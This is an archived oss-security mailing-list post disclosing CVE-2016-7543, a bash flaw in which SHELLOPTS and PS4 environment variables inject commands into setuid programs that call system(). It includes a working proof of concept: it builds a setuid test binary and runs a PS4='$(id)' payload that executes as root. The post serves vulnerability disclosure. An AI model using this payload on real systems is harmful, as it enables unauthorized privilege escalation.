X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["788" "Monday" "26" "September" "2016" "17:43:25" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>" "25" "[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4" nil nil nil "9" "2016092615:43:25" "[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4" (number mark "U       up201407890@ Sep 26   25/788   " thread-indent "\"[oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3825 invoked by uid 550); 26 Sep 2016 15:50:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32006 invoked from network); 26 Sep 2016 15:43:41 -0000
Message-ID: <20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>
Date: Mon, 26 Sep 2016 17:43:25 +0200
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: 7bit
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] CVE-2016-7543 -- bash SHELLOPTS+PS4

The recent bash 4.4 patched an old attack vector regarding
specially crafted SHELLOPTS+PS4 environment variables
against bogus setuid binaries using system()/popen().

https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html

"nn. Shells running as root no longer inherit PS4 from the environment,
closing a security hole involving PS4 expansion performing command
substitution."

# gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }'
# chmod 4755 ./test
# ls -l ./test
-rwsr-xr-x. 1 root root 8549 Sep 10 18:06 ./test
# exit
$ env -i SHELLOPTS=xtrace PS4='$(id)' ./test
uid=0(root)
Sat Sep 10 18:06:36 WET 2016

Sorry Tavis :P

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.


